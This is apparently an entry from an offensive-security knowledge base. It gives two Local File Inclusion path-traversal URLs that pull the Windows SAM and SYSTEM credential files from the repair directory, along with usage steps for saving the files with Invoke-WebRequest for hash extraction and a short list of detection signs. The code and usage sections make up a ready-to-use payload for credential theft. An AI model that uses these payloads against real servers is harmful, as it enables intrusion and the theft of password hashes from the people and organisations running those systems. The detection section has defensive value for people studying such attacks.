---
id: 75ab58e5-088e-4a35-9fd0-7196a0a1394d
name: windows-lfi-requests-to-sam-and-system
type: code
language: Powershell
verified: true
created_at: '2023-04-06T03:55:58.670338+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - lfi
  - path-traversal
validated: true
---

# windows-lfi-requests-to-sam-and-system

## Code

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

## Description

These URL snippets demonstrate path traversal payloads for Local File Inclusion (LFI) to access Windows SAM and SYSTEM files in the repair directory. They can be used in a browser, curl, or PowerShell Invoke-WebRequest to trigger inclusion and capture file contents.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| example.com | Vulnerable web application's domain | targetapp.internal |
| index.php | Vulnerable endpoint file | vulnerable.php |
| page | LFI parameter name | file, include |

## Usage

Substitute the domain and parameter in a tool like curl or PowerShell to request the URLs. Capture the response body to save the binary files: `Invoke-WebRequest -Uri $url -OutFile sam`. Use in LFI exploitation procedures to retrieve credential files for hash extraction.

## Detection

- Web server logs showing repeated '../' sequences in query parameters.
- Anomalous file reads in Windows Event Logs (Event ID 4663 for SAM/SYSTEM access).
- Network traffic to repair directory paths via WAF or proxy logs.

## Related

- [[procedures/Windows-LFI-to-RCE-via-Credentials-Files]]
